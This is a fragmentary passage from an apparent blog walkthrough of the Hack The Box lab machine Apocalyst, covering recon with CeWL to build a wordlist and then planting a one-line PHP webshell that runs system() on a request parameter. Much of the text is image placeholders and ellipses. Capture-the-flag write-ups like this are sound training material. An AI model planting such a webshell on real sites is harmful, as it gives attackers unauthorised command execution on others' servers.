[HTB: Apocalyst](/2021/02/09/htb-apocalyst.html)

![Apocalyst](https://0xdfimages.gitlab.io/img/apocalyst-cover.webp)
...
[![Apocalyst](/icons/box-apocalyst.webp)](https://hackthebox.com/machines/apocalyst)

[Apocalyst](https://hackthebox.com/machines/apocalyst)
...
Rated Difficulty ![Rated difficulty for Apocalyst](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/apocalyst-diff.webp)

Radar Graph ![Radar chart for Apocalyst](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/apocalyst-radar.webp)

User

01:13:22 Root

04:39:54 Creator ## Recon
...
![image-20210205140005295](https://0xdfimages.gitlab.io/img/image-20210205140005295.webp)
...
I’ll build a wordlist using the text on the site. [Cewl](https://github.com/digininja/CeWL) is a good tool for this (I’ve [shown it a few times before](about:/tags.html#cewl)). To generate a wordlist, I’ll run `cewl apocalyst.htb -w apocalyst.htb.wordlist --with-numbers`.
...
![image-20210205143104818](https://0xdfimages.gitlab.io/img/image-20210205143104818.webp)
...
![image-20210205143308693](https://0xdfimages.gitlab.io/img/image-20210205143308693.webp)
...
![image-20210205143444716](https://0xdfimages.gitlab.io/img/image-20210205143444716.webp)
...
![image-20210205143953571](https://0xdfimages.gitlab.io/img/image-20210205143953571.webp)
...
This shows I can write PHP that will be executed. I’ll change the code to a webshell, `<?php if (isset($_REQUEST['0xdf'])){ system($_REQUEST['0xdf']); echo "\n";}`, and now it executes commands:
